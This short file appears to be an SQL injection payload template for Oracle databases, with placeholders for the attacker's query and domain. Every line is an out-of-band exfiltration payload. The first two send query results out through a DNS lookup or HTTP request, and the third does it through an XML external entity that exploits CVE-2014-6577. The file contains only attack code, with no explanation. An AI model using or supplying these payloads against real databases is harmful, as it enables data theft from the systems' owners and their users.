SELECT UTL_INADDR.GET_HOST_ADDRESS('%PREFIX%.'||(%QUERY%)||'.%SUFFIX%.%DOMAIN%') FROM DUAL
# or SELECT UTL_HTTP.REQUEST('http://%PREFIX%.'||(%QUERY%)||'.%SUFFIX%.%DOMAIN%') FROM DUAL
# or (CVE-2014-6577) SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://%PREFIX%.'||(%QUERY%)||'.%SUFFIX%.%DOMAIN%/"> %remote;]>'),'/l') FROM dual 
